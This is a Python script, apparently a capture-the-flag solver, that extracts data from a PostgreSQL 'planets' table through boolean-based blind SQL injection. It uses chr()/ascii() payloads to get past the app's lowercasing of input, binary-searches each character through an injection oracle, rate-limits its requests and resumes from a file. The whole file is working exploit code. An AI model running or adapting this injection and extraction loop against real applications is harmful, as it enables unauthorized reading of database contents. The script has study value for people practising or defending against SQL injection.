"""Extract the text around the only mixed-case 'Sun' in the DB (Mercury's row).

ascii() is used rather than literal comparisons because the app lowercases the whole
payload, so a literal 'A' can never be matched -- but a byte value survives intact.
Resumable: writes to sun_ctx.txt after every character.
"""
import os
import sys
import time
from cmdexec import bit

GAP = 1.5
M = "chr(83)||chr(117)||chr(110)"
W = "position(%s in planets::text)>0" % M
CTX = ("(SELECT substr(planets::text, position(%s in planets::text), %d) FROM planets WHERE %s LIMIT 1)"
       % (M, int(os.environ.get("N", 26)), W))
N = int(os.environ.get("N", 26))
OUT = "sun_ctx.txt"


def byte_at(i):
    e = "(SELECT ascii(substr((%s),%d,1)))" % (CTX, i)
    if not bit("(%s)>0" % e):
        return ""
    lo, hi = 1, 127
    while lo < hi:
        mid = (lo + hi + 1) // 2
        time.sleep(GAP)
        if bit("(%s)>=%d" % (e, mid)):
            lo = mid
        else:
            hi = mid - 1
    return chr(lo)


have = open(OUT).read() if os.path.exists(OUT) else ""
print("[*] resuming from %d chars" % len(have), flush=True)
f = open(OUT, "a")
for i in range(len(have) + 1, N + 1):
    c = byte_at(i)
    f.write(c)
    f.flush()
    os.fsync(f.fileno())
    sys.stdout.write("\r[%d/%d] %s" % (i, N, open(OUT).read()))
    sys.stdout.flush()
print("\n[+] context = %r" % open(OUT).read(), flush=True)
